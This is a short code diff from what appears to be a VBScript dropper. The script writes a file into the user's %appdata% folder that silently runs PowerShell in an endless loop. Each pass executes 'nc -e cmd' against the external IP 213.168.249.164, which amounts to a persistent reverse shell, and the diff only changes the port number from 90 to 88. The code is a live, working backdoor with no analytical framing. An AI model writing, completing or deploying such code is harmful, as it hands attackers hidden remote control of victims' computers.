@@ -56,7 +56,7 @@ Function CreateFile()
 	Else
 		objFile.WriteLine "objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings(""%appdata%"")"
 	End If
-        objFile.WriteLine "objWshShl.Run ""powershell.exe while($true) { nc -e cmd 213.168.249.164 90}; start-sleep 5"",0"
+        objFile.WriteLine "objWshShl.Run ""powershell.exe while($true) { nc -e cmd 213.168.249.164 88}; start-sleep 5"",0"
 	WScript.Sleep 500
 	objFile.Close()
 	objWshShl.CurrentDirectory = objFso.GetParentFolderName(WScript.ScriptFullName)
